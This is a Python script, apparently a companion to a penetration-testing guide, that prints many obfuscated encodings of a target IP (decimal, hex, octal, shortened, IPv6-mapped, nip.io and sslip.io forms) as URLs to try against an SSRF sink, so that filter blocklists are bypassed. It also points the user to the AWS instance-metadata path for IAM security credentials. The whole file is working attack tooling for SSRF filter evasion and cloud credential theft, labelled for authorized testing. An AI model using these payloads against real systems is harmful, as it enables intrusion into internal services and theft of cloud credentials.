#!/usr/bin/env python3
"""
ip_encoder.py — print every IP-obfuscation form of a target IP for SSRF filter bypass (guide §6).
Filters often blocklist the literal IP (127.0.0.1 / 169.254.169.254); the HTTP client still
normalizes decimal/hex/octal/short/IPv6 forms to the same address. This prints them all so you
can try each against the sink.

AUTHORIZED TESTING ONLY.

Usage:
  python3 ip_encoder.py 169.254.169.254
  python3 ip_encoder.py 127.0.0.1
"""
import sys
import ipaddress


def forms(ip_str: str):
    ip = ipaddress.IPv4Address(ip_str)
    n = int(ip)
    a, b, c, d = str(ip).split(".")
    out = []
    out.append(("dotted",         ip_str))
    out.append(("decimal",        str(n)))
    out.append(("hex",            hex(n)))
    out.append(("hex dotted",     f"0x{int(a):02x}.0x{int(b):02x}.0x{int(c):02x}.0x{int(d):02x}"))
    out.append(("octal dotted",   f"0{int(a):o}.0{int(b):o}.0{int(c):o}.0{int(d):o}"))
    out.append(("octal padded",   f"0{int(a):04o}.0{int(b):04o}.0{int(c):04o}.0{int(d):04o}"))
    # short forms (collapse middle zero octets) — valid for inet_aton style parsers
    out.append(("short a.d",      f"{a}.{d}" if b == "0" and c == "0" else f"{a}.{b}.{c}.{d}"))
    out.append(("short a.c.d",    f"{a}.{c}.{d}" if b == "0" else f"{a}.{b}.{c}.{d}"))
    out.append(("mixed dec+hex",  f"{a}.{b}.{c}.0x{int(d):x}"))
    # IPv6 representations
    out.append(("IPv4-mapped v6", f"[::ffff:{ip_str}]"))
    out.append(("IPv4-mapped hex",f"[::ffff:{(n >> 16) & 0xffff:04x}:{n & 0xffff:04x}]"))
    out.append(("v6 compat",      f"[::{ip_str}]"))
    out.append(("trailing dot",   f"{ip_str}."))
    out.append(("nip.io",         f"{ip_str}.nip.io"))
    out.append(("sslip.io",       f"{ip_str}.sslip.io"))
    return out


def main():
    if len(sys.argv) != 2:
        print("usage: python3 ip_encoder.py <ip>   (e.g. 169.254.169.254)")
        sys.exit(1)
    target = sys.argv[1]
    print(f"# SSRF obfuscation forms for {target} (try each in the sink; guide §6)\n")
    for label, val in forms(target):
        print(f"{label:18} http://{val}/")
    print("\n# loopback equivalents to also try: localhost  0.0.0.0  [::1]  127.1")
    if target == "169.254.169.254":
        print("# metadata path: append /latest/meta-data/iam/security-credentials/  (AWS IMDSv1)")


if __name__ == "__main__":
    main()
